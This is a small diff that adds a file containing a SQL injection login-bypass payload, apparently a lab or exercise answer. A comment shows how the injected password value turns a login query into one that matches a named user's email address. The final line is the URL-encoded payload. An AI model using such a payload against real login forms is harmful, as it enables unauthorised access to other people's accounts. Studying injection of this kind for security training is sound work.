@@ -1,0 +1,11 @@
+/*
+
+Providing the following password will alter the SQL query 
+from:
+SELECT * FROM user WHERE email='fake@mail.com' AND password='abcd'
+to:
+SELECT * FROM user WHERE email='fake@mail.com' AND password='abcd' OR email='sawsea@bae.com'--
+
+*/
+
+a'+OR+email='sawsea@bae.com'--
